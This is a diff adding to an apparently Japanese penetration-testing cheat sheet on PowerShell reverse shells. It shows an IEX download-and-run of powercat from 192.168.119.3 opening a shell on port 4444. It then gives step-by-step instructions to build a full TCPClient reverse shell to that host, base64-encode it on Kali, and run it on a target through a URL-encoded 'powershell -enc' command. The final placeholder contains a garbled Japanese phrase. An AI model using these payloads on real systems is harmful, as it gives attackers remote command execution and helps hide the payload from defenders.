@@ -7,3 +7,35 @@
 ```.ps1
 IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c <attacker IP> -p 4444 -e powershell
 ```
+
+## Kali上でPowershell用のリバースシェルを生成してbase64エンコードのまま送信後、デコード・実行させる
+
+1. パワーシェルをKali上で起動
+```
+pwsh
+```
+
+2. Powershellのリバースシェル用コマンドをText変数に入れる
+```.ps1
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+```
+
+3. 
+```.ps1
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+```
+
+4. エンコードする
+```.ps1
+$EncodedText =[Convert]::ToBase64String($Bytes)
+```
+
+5. base64エンコードした文字列をターミナルに出力する
+```.ps1
+$EncodedText
+```
+
+6. ターゲット上でエンコードしたPowershellのリバースシェルコマンドをデコードさせて実行する
+```.ps1
+powershell%20-enc%20<先ほどの出リョk素あれた$EncodedTextの内容>
+```
